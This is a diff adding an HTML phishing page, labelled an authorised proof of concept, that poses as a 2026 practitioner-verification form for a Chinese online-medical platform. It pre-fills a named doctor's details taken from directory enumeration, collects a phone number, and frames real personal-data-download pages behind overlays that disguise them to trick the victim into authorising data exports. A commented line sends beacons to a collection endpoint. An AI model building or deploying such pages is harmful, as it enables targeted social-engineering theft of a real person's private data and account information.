@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>执业信息核验</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,"PingFang SC",sans-serif; }
+  body { background:#f0f4f8; min-height:100vh; }
+  .hdr { background:linear-gradient(135deg,#0b5cad,#1182d6); color:#fff; padding:18px 16px 14px; }
+  .hdr .tag { display:inline-block; font-size:10px; border:1px solid rgba(255,255,255,.5); border-radius:3px; padding:1px 6px; margin-bottom:8px; letter-spacing:1px; }
+  .hdr h1 { font-size:18px; font-weight:600; }
+  .hdr p { font-size:11px; opacity:.85; margin-top:4px; }
+  .card { background:#fff; margin:12px; border-radius:10px; padding:16px; box-shadow:0 1px 4px rgba(20,60,100,.08); }
+  .doc-row { display:flex; align-items:center; gap:12px; padding-bottom:12px; border-bottom:1px dashed #e3eaf2; }
+  .avatar { width:44px; height:44px; border-radius:50%; background:#dce9f5; display:flex; align-items:center; justify-content:center; color:#0b5cad; font-size:18px; font-weight:600; }
+  .doc-row .nm { font-size:15px; font-weight:600; color:#1a2b3c; }
+  .doc-row .org { font-size:11px; color:#7b8a99; margin-top:2px; }
+  .ok-badge { margin-left:auto; font-size:10px; color:#0a8f4d; background:#e8f7ef; border-radius:10px; padding:2px 8px; }
+  .step { display:none; } .step.on { display:block; }
+  .lbl { font-size:12px; color:#44515f; margin:14px 0 6px; }
+  input { width:100%; height:42px; border:1px solid #d6e0ea; border-radius:8px; padding:0 12px; font-size:15px; outline:none; }
+  input:focus { border-color:#1182d6; }
+  .btn { width:100%; height:44px; background:#1182d6; color:#fff; border:none; border-radius:8px; font-size:15px; margin-top:16px; }
+  .btn:active { background:#0b5cad; }
+  .btn.gray { background:#e7eef5; color:#44515f; }
+  .note { font-size:10px; color:#9aa8b5; margin-top:10px; line-height:1.5; }
+  .bar { height:4px; background:#e3eaf2; border-radius:2px; margin:6px 0 2px; }
+  .bar i { display:block; height:4px; background:#1182d6; border-radius:2px; transition:width .4s; }
+  .pct { font-size:10px; color:#7b8a99; text-align:right; }
+  .comp-wrap { position:relative; margin:0 12px; border-radius:10px; overflow:hidden; background:#fff; box-shadow:0 1px 4px rgba(20,60,100,.08); }
+  .comp-wrap iframe { width:100%; height:660px; border:0; display:block; }
+  .comp-cover { position:absolute; left:0; right:0; top:0; height:150px; background:#fff; z-index:5; }
+  .comp-cover .t1 { font-size:14px; font-weight:600; color:#1a2b3c; padding:14px 16px 2px; }
+  .comp-cover .t2 { font-size:11px; color:#7b8a99; padding:0 16px; line-height:1.6; }
+  .comp-cover .t3 { font-size:10px; color:#0b5cad; padding:6px 16px; }
+  .done { text-align:center; padding:40px 16px; }
+  .done .ic { width:56px; height:56px; border-radius:50%; background:#e8f7ef; color:#0a8f4d; font-size:28px; line-height:56px; margin:0 auto 12px; }
+  .done h2 { font-size:16px; color:#1a2b3c; }
+  .done p { font-size:12px; color:#7b8a99; margin-top:6px; }
+  .foot { text-align:center; font-size:10px; color:#aab6c2; padding:10px 0 20px; }
+  .badge-demo { position:fixed; right:8px; bottom:8px; background:#c0392b; color:#fff; font-size:9px; padding:2px 8px; border-radius:8px; z-index:99; }
+</style>
+</head>
+<body>
+<div class="badge-demo">PoC · 授权评估 · 禁止投放</div>
+
+<div class="hdr">
+  <span class="tag">平台合规</span>
+  <h1>2026 年度执业信息核验</h1>
+  <p>依《互联网诊疗监管细则》要求，执业医师需完成年度信息核验</p>
+</div>
+
+<div class="card">
+  <div class="doc-row">
+    <div class="avatar" id="d-ava">王</div>
+    <div>
+      <div class="nm" id="d-nm">王意林 医生</div>
+      <div class="org" id="d-org">小荷医生平台 · 助手（认证号）</div>
+    </div>
+    <div class="ok-badge">名单已核验</div>
+  </div>
+  <div class="lbl">核验进度</div>
+  <div class="bar"><i id="pg" style="width:25%"></i></div>
+  <div class="pct" id="pct">1/4 · 身份确认</div>
+</div>
+
+<!-- STEP 1: 手机号 -->
+<div class="card step on" id="s1">
+  <div class="lbl">请输入平台预留手机号完成身份确认</div>
+  <input id="phone" type="tel" maxlength="11" placeholder="预留手机号">
+  <button class="btn" onclick="step2()">确认手机号，开始核验</button>
+  <div class="note">手机号仅用于与平台执业档案比对（预留号段 <span id="pfx"></span>），核验完成后自动销毁。</div>
+</div>
+
+<!-- STEP 2: 第一项核验（真导出页 iframe + 遮罩重写） -->
+<div class="step" id="s2">
+  <div class="comp-wrap">
+    <iframe id="f1" src="about:blank"></iframe>
+    <div class="comp-cover">
+      <div class="t1" id="cv-t1">执业档案调取组件（1/2）</div>
+      <div class="t2" id="cv-t2">按监管要求，平台需调取您的执业关联档案完成年度核验。请在下方组件中完成运营商认证（短信验证码由官方通道下发）。</div>
+      <div class="t3">🔒 数据经平台加密通道传输，仅用于本次核验</div>
+    </div>
+  </div>
+  <div style="margin:12px"><button class="btn" onclick="step3()">我已完成第 1 项认证</button>
+<button class="btn gray" onclick="window.open('https://doctorapp.lvsongguo.com/ucenter/privacy/personal-download?aid=3889','doctor3889','width=400,height=700')">执业档案原件调取（弹窗·3889）</button></div>
+</div>
+
+<!-- STEP 3: 第二项核验（验证态全局生效假设：无需再收码，仅操作） -->
+<div class="step" id="s3">
+  <div class="card" style="padding:12px">
+    <div class="lbl" style="margin-top:0">✓ 身份认证已通过，进入关联平台数据核验（2/2）</div>
+    <div class="note">首次认证已生效，本项无需再次收取验证码，直接完成操作即可。</div>
+  </div>
+  <div class="comp-wrap">
+    <iframe id="f2" src="about:blank"></iframe>
+    <div class="comp-cover">
+      <div class="t1">关联平台数据核验组件（2/2）</div>
+      <div class="t2">监管要求同步核验关联平台账号数据归档状态，请完成下方确认操作。</div>
+      <div class="t3">🔒 已复用本次身份认证</div>
+    </div>
+  </div>
+  <div style="margin:12px"><button class="btn" onclick="step4()">完成全部核验</button></div>
+</div>
+
+<!-- STEP 4: 完成 -->
+<div class="step" id="s4">
+  <div class="card done">
+    <div class="ic">✓</div>
+    <h2>执业信息核验已全部提交</h2>
+    <p>审核结果将于 1 个工作日内发送至您的站内信</p>
+  </div>
+</div>
+
+<div class="foot">安全评估 PoC（授权编号 P0-SUPPLEMENT-20260928）· 页面不投放生产 · 信标仅落本地 console</div>
+
+<script>
+/* ===== attack-side 配置（名单注入点） =====
+ * TARGET 从医生目录遍历结果填充：
+ *   GET /nethospusr/search/doctor_list?query=<姓>&page_num=N → doctor.user_id = passport uid
+ *   janus 认证接口补全：真实姓名/医院/掩码手机号（前3位）
+ * IFRAMES: 链式核验目标。IFRAMES[0] 是真验证发生的第一项（受害者输一次码），
+ * 之后各项若「验证态全局生效」成立，则无需再收码——本页 UI 即按此假设编排。
+ */
+var TARGET = {
+  uid: '3031812297723148',
+  name: '王意林',
+  org: '小荷医生平台 · 助手（认证号）',
+  prefix: '123',
+  surname: '王'
+};
+var IFRAMES = [
+  'https://api.amemv.com/ucenter_web/app/aweme/privacy/person_information_download',
+  'https://api.amemv.com/ucenter_web/app/aweme/privacy/person_information_download?step=2'
+  /* 生产变体：第2项换 amemv H5（抖音包，社交数据面更广）：
+     'https://api.amemv.com/ucenter_web/app/aweme/privacy/person_information_download' */
+];
+
+/* ===== 渲染注入 ===== */
+document.getElementById('d-nm').textContent = TARGET.name + ' 医生';
+document.getElementById('d-org').textContent = TARGET.org;
+document.getElementById('d-ava').textContent = TARGET.surname;
+document.getElementById('pfx').textContent = TARGET.prefix + '**';
+
+/* ===== 信标（PoC 落 console/内存；生产替换收集端） ===== */
+var BK = [];
+function beacon(ev, extra){
+  BK.push({ev:ev, t:Date.now(), extra:extra||{}});
+  console.log('BEACON', ev, Date.now(), JSON.stringify(extra||{}));
+  /* 生产：navigator.sendBeacon('//collector/', JSON.stringify({ev,ev.t,...})) */
+}
+
+function step2(){
+  var p = document.getElementById('phone').value.trim();
+  if(!/^1\d{10}$/.test(p)){ alert('请输入正确手机号'); return; }
+  beacon('phone_submit', {prefix3: p.slice(0,3), match: p.slice(0,3)===TARGET.prefix, uid: TARGET.uid});
+  document.getElementById('s1').classList.remove('on');
+  document.getElementById('s2').classList.add('on');
+  document.getElementById('f1').src = IFRAMES[0];
+  document.getElementById('pg').style.width='50%';
+  document.getElementById('pct').textContent='2/4 · 档案调取';
+  beacon('iframe_shown', {idx:0, url: IFRAMES[0]});
+}
+function step3(){
+  beacon('iframe_flow1_done');  /* 回扫锚：第1包申请时刻 ≈ 此刻（若受害者已完成申请） */
+  document.getElementById('s2').classList.remove('on');
+  document.getElementById('s3').classList.add('on');
+  document.getElementById('f2').src = IFRAMES[1];
+  document.getElementById('pg').style.width='75%';
+  document.getElementById('pct').textContent='3/4 · 关联核验';
+  beacon('iframe_shown', {idx:1, url: IFRAMES[1]});
+}
+function step4(){
+  beacon('flow_all_done');
+  document.getElementById('s3').classList.remove('on');
+  document.getElementById('s4').classList.add('on');
+  document.getElementById('pg').style.width='100%';
+  document.getElementById('pct').textContent='4/4 · 完成';
+}
+beacon('page_open', {target_uid: TARGET.uid});
+</script>
+</body>
+</html>
